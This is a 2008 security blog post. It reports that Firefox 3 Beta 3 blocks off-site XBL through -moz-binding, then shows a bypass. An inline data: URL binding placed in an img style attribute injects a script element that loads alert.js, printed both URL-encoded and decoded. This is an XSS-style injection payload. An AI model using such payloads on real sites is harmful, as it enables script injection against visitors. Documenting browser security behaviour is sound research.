---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2008/02/28/firefox-3-disallows-cross-site-xbl
categories:
- Information Security
comments: []
date: 2008-02-28 15:40:45 +0100
date_gmt: 2008-02-28 15:40:45 +0100
doi: https://doi.org/10.59348/vz0z6-bn678
roguescholar: https://rogue-scholar.org/records/0yy21-yye20
atproto: at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mn5b2jb2o
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
- XBL
- offsite
- Firefox 3
title: Firefox 3 disallows cross-site XBL
wordpress_id: 256
wordpress_url: http://pro.grammatic.org/post-firefox-3-disallows-crosssite-xbl-45.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mn5b2jb2o"
kcworks: https://works.hcommons.org/records/j7g4p-afw07
references:
- http://www.mozilla.org/xbl # Mozilla XBL namespace URI
---

<p>Well, I decided to play around a little with Firefox 3 Beta 3 today and discovered that it looks like the ever popular -moz-binding css attribute is now rendered a little less useful. It is now impossible to load off-site XBL via this method.</p>
<p>However, all is not lost. For in patching one of the biggest holes in Firefox's security model, the infinite wisdom of the FF devs is that it is now possible to embed a -moz-binding URL tag inline, like this:</p>

{% highlight html %}
<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22
http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js
%22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20
document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/
binding%3E%3C/bindings%3E)" />
{% endhighlight %}

<p>Using this method provides for no use of a fragment identifier, indeed it is only possible to use the first element. The above XBL decodes to:</p>

{% highlight xml %}
<?xml version="1.0"?>
<bindings xmlns="http://www.mozilla.org/xbl">
	<binding id="loader">
	<implementation>
		<constructor>
		
		var url = "alert.js";
		var scr = document.createElement("script");
		scr.setAttribute("src",url);
		var bodyElement = document.getElementsByTagName("html").item(0);
		bodyElement.appendChild(scr);CLOSE CDATA>
		</constructor>
	</implementation>
	</binding>
</bindings>
{% endhighlight %}

<p>which essentially creates a nice new DOM script element that loads alert.js.</p>